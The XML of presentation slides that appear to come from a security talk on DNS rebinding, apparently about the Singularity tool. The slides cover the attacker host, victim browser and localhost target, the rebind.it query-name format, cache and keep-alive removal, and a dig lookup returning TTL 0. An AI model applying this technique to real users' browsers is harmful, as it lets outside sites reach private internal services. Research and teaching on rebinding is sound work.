              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35.185.206.165</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="281" name="Google Shape;281;p37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899225" y="35617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Target Service 127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="282" name="Google Shape;282;p37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899225" y="134745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Victim (Browser)</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="283" name="Google Shape;283;p37"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2368526" y="1086250"/>
            <a:ext cx="456175" cy="642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7" name="Shape 287"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="288" name="Google Shape;288;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Learning More About the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Basics</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> of DNS Rebinding</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="289" name="Google Shape;289;p38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1152475"/>
            <a:ext cx="85878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[2017] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>DEF CON 25 - Luke Young - There’s no place like 127.001: Achieving reliable DNS rebinding (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://youtu.be/Q0JG_eKLcws</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>[2010] Black Hat USA &amp; DEF CON 18 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Craig Heffner -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> How to hack millions of routers (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://youtu.be/VAaqABpjiUQ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>https://youtu.be/Zazk0plSoQg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>[2007] 24C3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Dan Kaminsky - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>DNS Rebinding And More Packet Tricks (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>https://youtu.be/YwbpnZe74ds</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>[2018] NorthSec - Danny Cooper &amp; Allan Wirth - Homeward Bound: Scanning Private IP Space with DNS Rebinding (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>https://youtu.be/9iSvAS6IdiM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>[2013] WOOT '13 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Yunxing Dai, Ryan Resig - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>FireDrill: Interactive DNS Rebinding </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1500"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1500" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>https://www.usenix.org/conference/woot13/workshop-program/presentation/Dai</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1500"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr sz="1500"/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>[2007] Stanford University - Protecting Browsers from DNS Rebinding Attacks (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId9"/>
              </a:rPr>
              <a:t>https://crypto.stanford.edu/dns/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a: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93" name="Shape 293"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr descr="DNS rebinding on iOS in 5 seconds" id="294" name="Google Shape;294;p39" title="DNS Rebinding Demo 1">
            <a:hlinkClick r:id="rId3"/>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2058875" y="1136025"/>
            <a:ext cx="5125775" cy="3836976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="295" name="Google Shape;295;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iOS Demo: DNS rebinding in 5 s (cache flooding)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9" name="Shape 299"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="300" name="Google Shape;300;p4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DNS Rebinding Attack: Building on Reliable Foundations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4" name="Shape 304"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="305" name="Google Shape;305;p41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="98600" y="329350"/>
            <a:ext cx="3255600" cy="447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br>
              <a:rPr lang="en" sz="3000"/>
            </a:br>
            <a:endParaRPr sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>You Visit a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Completely</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Innocuous</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Looking Website</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="306" name="Google Shape;306;p41"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3354276" y="244538"/>
            <a:ext cx="5692876" cy="42766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0" name="Shape 310"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="311" name="Google Shape;311;p42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="213100"/>
            <a:ext cx="8241300" cy="479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3000"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="3000">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Malicious JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="3000">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Code Downloaded.</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="3000">
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sending First </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="3600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DNS Query</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="3600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>...</a:t>
            </a:r>
            <a:endParaRPr sz="3600">
              <a:solidFill>
                <a:schemeClr val="dk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5" name="Shape 315"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="316" name="Google Shape;316;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What’s in a Query?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="317" name="Google Shape;317;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DNS query from a browser to Singularity DNS server:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35.185.206.165</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>127.0.0.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3504134790</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>d.rebind.it</a:t>
            </a:r>
            <a:endParaRPr b="1"/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)tart</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35.185.206.165</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: Attacker Host IP Address</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>127.0.0.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: Target Service IP Address or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Name</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3504134790</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: Session ID</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: DNS Rebinding Strategy - “first then second” IP address.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)nd</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>d.rebind.it</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: Attack Host Domain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1" name="Shape 321"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="322" name="Google Shape;322;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Removing HTTP Performance Enhancing Techniques That Impede DNS Rebinding</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="323" name="Google Shape;323;p44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1669850"/>
            <a:ext cx="8520600" cy="289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 Caching - We want the browser to get fresh copies of resources.</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Keep-Alive - We don’t want the browser to stick to the attacker’s server.</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324" name="Google Shape;324;p44"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1247775" y="2100263"/>
            <a:ext cx="6648450" cy="942975"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="325" name="Google Shape;325;p44"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1247775" y="3966650"/>
            <a:ext cx="5183403" cy="5727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9" name="Shape 329"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="330" name="Google Shape;330;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TTL Values</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="331" name="Google Shape;331;p45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="155850" y="1152475"/>
            <a:ext cx="8832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latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t># 1st query</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1600">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>$ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>dig +noall +ans</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>wer  s-35.185.206.165-127.0.0.1-123-fs-e.d.rebind.it</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1600">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>S-35.185.206.165-127.0.0.1-123-fs-e.d.rebind.it. </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1600">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> IN A 35.185.206.165</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1600">
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t># 2nd query</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1600">
